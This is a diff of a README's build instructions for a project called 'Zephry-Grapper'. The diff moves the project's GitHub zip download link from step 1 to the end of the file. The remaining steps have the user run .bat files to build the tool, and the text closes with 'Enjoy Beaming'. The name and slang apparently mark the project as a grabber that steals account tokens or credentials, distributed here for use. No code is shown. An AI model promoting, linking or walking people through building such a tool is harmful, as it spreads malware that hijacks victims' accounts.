@@ -65,7 +65,7 @@
 
 ## How To Build
 
-    • 1) Download The Newest Release By Clicking Here [Download](https://github.com/Darkblade54/Zephry-Grapper/archive/refs/heads/main.zip)
+    • 1) Download The Newest Release
     • 2) Extract The Zip Into A Folder
     • 3) Make Sure You Have Python Istalled If Not Run "install_python.bat"
     • 4) Run "Start.bat"
@@ -74,3 +74,4 @@
     • 7) Wait Until Build Is Done
 ### Enjoy Beaming
 <img src="https://cdn.discordapp.com/attachments/1164559111879393342/1164618348483584071/icon.jpg?ex=6556535b&is=6543de5b&hm=0521f255b7de51cb7ed20c378436fa24129aff886daaeb2240038ec4c06de176&">
+[Download](https://github.com/Darkblade54/Zephry-Grapper/archive/refs/heads/main.zip)
